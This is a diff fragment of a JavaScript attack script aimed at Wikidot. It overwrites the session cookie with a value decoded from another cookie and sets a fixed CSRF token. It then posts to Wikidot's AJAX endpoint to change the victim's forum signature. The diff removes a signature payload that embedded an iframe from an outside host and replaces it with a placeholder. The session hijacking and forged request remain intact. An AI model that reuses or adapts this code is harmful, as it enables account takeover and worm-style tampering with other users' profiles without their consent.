@@ -16,9 +16,7 @@ function getCookie(cname, text) {
 document.cookie = "WIKIDOT_SESSION_ID=" + getCookie("WIKIDOT_SESSION_ID",atob(getCookie("new", document.cookie))) + ";path=/;domain=wikidot.com;";
 document.cookie = "wikidot_token7=4m64ez22na9pf7k6s988;path=/;";
 var http = new XMLHttpRequest();
-sig = '[[embed]]
-<iframe class="" style="" frameborder="0" width="200px" height="25px" align="" scrolling="no" src="http://checkesh.esy.es/t/iframewin.php"></iframe>
-[[/embed]]';
+sig = '4';
 var url = "https://www.wikidot.com/ajax-module-connector.php";
 var params = "source=" + sig + "&action=DashboardProfileAction&event=saveForumSignature&moduleName=Empty&callbackIndex=3&wikidot_token7=4m64ez22na9pf7k6s988";
 http.open("POST", url, true);
